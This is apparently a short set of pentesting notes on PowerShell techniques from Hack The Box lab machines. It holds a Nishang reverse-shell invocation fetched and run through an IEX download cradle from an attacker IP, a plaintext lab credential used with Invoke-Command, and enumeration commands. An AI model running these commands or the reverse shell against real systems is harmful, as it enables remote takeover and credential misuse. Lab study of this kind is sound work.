### Nishang
If we want to add a .ps1 file into a Windows machine such as the [Nishang]() series we can modify the latest line of such file (to load the script and then execute it):
```powershell
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 1234
```
Then we can execute it by using the following command on the compromised machine:
```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/Invoke-PowerShellTcp.ps1')
```
Examples:
[[Anubis#^bcdb9e]]

### Invoke-Command
Module to execute commands on the specified machine:
```bash
PS> $Password = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
PS> $Creds = New-Object System.Management.Automation.PSCredential('timelapse.htb\svc_deploy', $Password)
*PS> Invoke-Command -ComputerName dc01 -Credential $Creds -ScriptBlock { whoami }
```
Examples:
[[Fulcrum#^0145f0]]

### Get-SMBShare
Retrieves the local shares:
```bash
PS C:\Users\BTables\Desktop> Get-SMBShare

Name   ScopeName Path Description  
----   --------- ---- -----------  
ADMIN$ *              Remote Admin 
C$     *              Default share
IPC$   *              Remote IPC
```
Examples:
[[Fulcrum#^cae2ef]]

### Select-String
Search files on the system
```bash
PS X:\fulcrum.local\scripts> Select-String -Path "X:\fulcrum.local\scripts\*.ps1" -Pattern Administrator
PS X:\fulcrum.local\scripts> Select-String -Path "X:\fulcrum.local\scripts\*.ps1" -Pattern 923a
```
Example:
[[Fulcrum#^08db04]]
### AD CS
TODO
[[Anubis]]

### Invoke-PowerShellTCP
TODO
[[Anubis]]

